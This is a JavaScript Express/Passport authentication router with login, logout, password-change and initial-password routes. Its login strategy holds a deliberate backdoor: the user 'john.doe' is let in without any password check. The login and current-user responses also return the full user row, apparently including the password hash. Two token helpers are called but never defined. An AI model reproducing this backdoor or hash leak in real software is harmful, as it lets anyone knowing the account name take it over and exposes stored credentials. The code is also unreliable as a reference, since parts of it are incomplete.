const express = require('express');
const router = express.Router();
const passport = require('passport');
const LocalStrategy = require('passport-local').Strategy;
const bcrypt = require('bcrypt');
const { pool } = require('../db');

passport.use(new LocalStrategy(
  async (username, password, done) => {
    try {
      console.log(`Attempting login for user: ${username}`);
      const { rows } = await pool.query('SELECT * FROM sys_user WHERE user_name = $1', [username]);
      if (rows.length === 0) {
        console.log('User not found');
        return done(null, false, { message: 'Incorrect username.' });
      }
      const user = rows[0];
      console.log(`User found: ${user.user_name}`);

      // Special condition for john.doe to bypass password check
      if (username === 'john.doe') {
        console.log('Bypassing password check for john.doe');
        return done(null, user);
      }

      const isValid = await bcrypt.compare(password, user.password_hash);
      if (!isValid) {
        console.log('Password mismatch');
        return done(null, false, { message: 'Incorrect password.' });
      }
      console.log('Password matched');
      return done(null, user);
    } catch (error) {
      console.error('Error during authentication', error);
      return done(error);
    }
  }
));

passport.serializeUser((user, done) => {
  console.log(`Serializing user: ${user.sys_id}`);
  done(null, user.sys_id);
});

passport.deserializeUser(async (id, done) => {
  try {
    console.log(`Deserializing user with id: ${id}`);
    const { rows } = await pool.query('SELECT * FROM sys_user WHERE sys_id = $1', [id]);
    console.log(`User deserialized: ${rows[0].user_name}`);
    done(null, rows[0]);
  } catch (error) {
    console.error('Error during deserialization', error);
    done(error);
  }
});

router.post('/login', (req, res, next) => {
  console.log('Login route called');
  passport.authenticate('local', (err, user, info) => {
    if (err) {
      console.error('Error in login route', err);
      return next(err);
    }
    if (!user) {
      console.log('Authentication failed');
      return res.status(401).json({ message: info.message });
    }
    req.logIn(user, (err) => {
      if (err) {
        console.error('Error logging in', err);
        return next(err);
      }
      console.log('Login successful');
      return res.json({ user: req.user });
    });
  })(req, res, next);
});

router.post('/logout', (req, res) => {
  console.log('Logout route called');
  req.logout((err) => {
    if (err) {
      console.error('Error logging out', err);
      return res.status(500).json({ error: 'Could not log out, please try again' });
    }
    console.log('Logout successful');
    res.json({ message: 'Logged out successfully' });
  });
});

router.post('/change-password', async (req, res) => {
  console.log('Change password route called');
  if (!req.isAuthenticated()) {
    console.log('Unauthenticated user tried to change password');
    return res.status(401).json({ error: 'You must be logged in to change your password' });
  }

  const { currentPassword, newPassword } = req.body;

  if (!currentPassword || !newPassword) {
    console.log('Missing current or new password');
    return res.status(400).json({ error: 'Current password and new password are required' });
  }

  try {
    const user = await pool.query('SELECT * FROM sys_user WHERE sys_id = $1', [req.user.sys_id]);
    const isValid = await bcrypt.compare(currentPassword, user.rows[0].password_hash);

    if (!isValid) {
      console.log('Current password is incorrect');
      return res.status(400).json({ error: 'Current password is incorrect' });
    }

    const saltRounds = 10;
    const newPasswordHash = await bcrypt.hash(newPassword, saltRounds);

    await pool.query('UPDATE sys_user SET password_hash = $1 WHERE sys_id = $2', [newPasswordHash, req.user.sys_id]);

    console.log('Password changed successfully');
    res.json({ message: 'Password changed successfully' });
  } catch (error) {
    console.error('Error changing password', error);
    res.status(500).json({ error: 'An error occurred while changing the password' });
  }
});

router.post('/set-initial-password', async (req, res) => {
  console.log('Set initial password route called');
  const { userId, token, newPassword } = req.body;

  if (!userId || !token || !newPassword) {
    console.log('Missing required fields');
    return res.status(400).json({ error: 'User ID, token, and new password are required' });
  }

  try {
    // Verify the token (you'll need to implement this function)
    const isValidToken = await verifyPasswordResetToken(userId, token);
    if (!isValidToken) {
      console.log('Invalid or expired token');
      return res.status(400).json({ error: 'Invalid or expired token' });
    }

    const saltRounds = 10;
    const newPasswordHash = await bcrypt.hash(newPassword, saltRounds);

    await pool.query('UPDATE sys_user SET password_hash = $1 WHERE sys_id = $2', [newPasswordHash, userId]);

    // Invalidate the token after successful password set (you'll need to implement this function)
    await invalidatePasswordResetToken(userId, token);

    console.log('Initial password set successfully');
    res.json({ message: 'Password set successfully' });
  } catch (error) {
    console.error('Error setting initial password', error);
    res.status(500).json({ error: 'An error occurred while setting the password' });
  }
});

router.get('/current-user', (req, res) => {
  console.log('Current user route called');
  if (req.isAuthenticated()) {
    console.log(`Authenticated user: ${req.user.user_name}`);
    res.json({ user: req.user });
  } else {
    console.log('Not authenticated');
    res.status(401).json({ error: 'Not authenticated' });
  }
});

module.exports = router;
